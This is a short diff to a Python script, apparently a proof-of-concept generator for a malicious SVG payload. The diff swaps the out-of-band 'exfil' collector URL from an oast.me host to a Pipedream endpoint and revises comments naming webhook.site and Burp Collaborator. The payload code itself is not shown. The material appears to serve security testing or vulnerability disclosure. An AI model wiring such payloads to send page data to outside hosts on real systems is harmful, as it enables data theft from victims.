@@ -19,7 +19,7 @@ What the payload proves on execution (READ-ONLY, no account mutations):
 
 Usage:
     ./tools/gen_exfil_svg.py                    # use default EXFIL below
-    EXFIL=https://x.oast.me/exfil ./tools/gen_exfil_svg.py
+    EXFIL=https://<your-id>.m.pipedream.net ./tools/gen_exfil_svg.py
 """
 import os
 import sys
@@ -28,11 +28,11 @@ ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 
 # OOB collector. The on-page overlay is the PRIMARY proof; this is the
 # independent second channel. Static hosts (raw.githubusercontent) cannot log,
-# so point this at an interactsh / webhook.site / Burp Collaborator URL, or
-# leave a clearly-marked placeholder.
+# so point this at a RequestBin/Pipedream, webhook.site or Burp Collaborator
+# URL, or leave a clearly-marked placeholder.
 EXFIL = os.environ.get(
     "EXFIL",
-    "https://dao24e6635sqh9f6ft7gqsbzb3so471a1.oast.me/exfil",
+    "https://eo118uqkc7gd1r7.m.pipedream.net",
 )
 
 HANDLER = (
